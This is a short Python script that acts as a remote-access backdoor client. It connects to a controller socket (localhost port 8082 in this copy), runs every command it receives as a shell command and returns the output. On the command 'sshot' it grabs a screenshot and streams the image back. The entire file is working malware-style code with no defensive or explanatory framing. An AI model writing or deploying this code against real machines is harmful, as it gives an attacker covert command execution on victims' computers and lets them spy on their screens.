import socket
import subprocess
from PIL import ImageGrab


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

port = 8082

adresstup = ('127.0.0.1',port)
s.connect(adresstup)

while True:
    
    cmd = s.recv(1024).decode()
    if cmd == "sshot":
        from PIL import ImageGrab
        ss_img = ImageGrab.grab(bbox=None)
        ss_img.save("S88.jpg")
        with open('S88.jpg', 'rb') as file:
    # Read and send image data in chunks
            chunk_size = 1024
            data = file.read(chunk_size)
            while data:
                s.send(data)
                data = file.read(chunk_size)

    elif cmd == "endit":
        s.close()
    else:   
        output = (subprocess.getoutput(cmd)).encode()
        s.send(output)



        
